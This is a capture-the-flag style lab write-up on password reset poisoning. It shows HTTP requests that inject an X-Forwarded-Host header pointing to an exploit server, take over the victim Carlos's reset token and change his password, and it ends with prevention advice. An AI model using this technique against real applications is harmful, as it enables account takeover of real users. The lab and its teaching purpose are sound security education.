# Password Reset Poisoning via Middleware



## Overview



**Password Reset Poisoning** occurs when an application generates password reset links using attacker-controlled input, 
such as the `Host` or `X-Forwarded-Host` header.



In this lab, the application trusts the `X-Forwarded-Host` header when generating password reset links.



This allows an attacker to make the reset link point to an attacker-controlled Exploit Server and capture the victim's 
password reset token.



---



## Goal



Log in to Carlos's account by obtaining his password reset token and using it to set a new password.



**Credentials:**



```text

wiener:peter

```



**Victim:**




```text

carlos

```



---



## Vulnerability



The password reset functionality accepts:



```http

X-Forwarded-Host: attacker-server


```



The application then uses this value when constructing the password reset URL.



Normal behavior:



```text

https://LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=TOKEN

```



After poisoning:



```text

https://EXPLOIT-SERVER/forgot-password?temp-forgot-password-token=TOKEN

```



When Carlos clicks the link, his request reaches the Exploit Server and the token becomes visible in the access log.


---



## Exploitation Steps



### 1. Identify the Password Reset Request



Submit the username `wiener` through the **Forgot password** functionality and send the request to Burp Repeater.




Example:



```http

POST /forgot-password HTTP/2

Host: LAB-ID.web-security-academy.net


username=wiener

```



---



### 2. Test `X-Forwarded-Host`



Add:



```http

X-Forwarded-Host: EXPLOIT-SERVER

```



The application accepts the header and generates the reset link using the supplied host.



---



### 3. Poison Carlos's Reset Link



Change:



```text

username=wiener

```



to:



```text

username=carlos

```



Keep:



```http

X-Forwarded-Host: EXPLOIT-SERVER

```



The application sends Carlos a password reset link pointing to the Exploit Server.



---



### 4. Capture the Reset Token



Open:



**Exploit Server → Access log**



After Carlos clicks the link, the request contains:



```http

GET /forgot-password?temp-forgot-password-token=TOKEN

```



Copy the `temp-forgot-password-token`.



---



### 5. Reset Carlos's Password



Use the captured token with the legitimate password reset endpoint:



```http

POST /forgot-password?temp-forgot-password-token=TOKEN

```



Body:



```text

temp-forgot-password-token=TOKEN&new-password-1=1234&new-password-2=1234

```



The password is now changed.



---



### 6. Log In



```text

Username: carlos

Password: 1234

```



The lab is solved.



---



## Key Takeaway



The vulnerability is caused by trusting attacker-controlled forwarded host information when generating security-sensitive 

URLs.



```text

Attacker-controlled X-Forwarded-Host

                ↓

      Poisoned reset URL

                ↓

         Carlos clicks it

                ↓

   Token reaches Exploit Server

                ↓

      Attacker obtains token

                ↓


       Password is changed

```



## Prevention



* Do not trust user-controlled `Host` or `X-Forwarded-Host` headers when generating password reset URLs.

* Use a fixed, trusted domain for security-sensitive links.

* Properly configure and validate forwarded headers at the reverse proxy/middleware layer.

* Use short-lived, single-use reset tokens tied to the intended account.


